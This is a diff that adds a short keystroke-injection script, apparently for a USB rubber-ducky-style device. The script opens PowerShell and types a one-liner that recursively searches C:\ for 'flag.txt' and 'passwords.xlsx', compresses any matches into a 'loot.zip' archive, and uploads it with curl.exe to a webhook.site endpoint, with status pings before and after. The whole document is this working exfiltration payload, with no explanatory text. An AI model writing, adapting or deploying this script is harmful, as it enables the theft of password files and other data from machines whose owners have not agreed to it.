@@ -1,0 +1,5 @@
+Delay 2000
+RunWin powershell
+Delay 4000
+Print $p="C:\"; $u="https://webhook.site/YOUR_UNIQUE_ID"; curl.exe -s -o NUL "$u?status=started"; $t=@("flag.txt","passwords.xlsx"); $f=ls $p -Rec -Inc $t -Ea 0 | Sort Name -Unique; if($f){ $z="$env:TEMP\loot.zip"; Compress-Archive -Path $f.FullName -DestinationPath $z -Force; curl.exe -s -o NUL -F "file=@$z" $u; rm $z } else { curl.exe -s -o NUL "$u?status=not_found" }
+Press KEY_ENTER
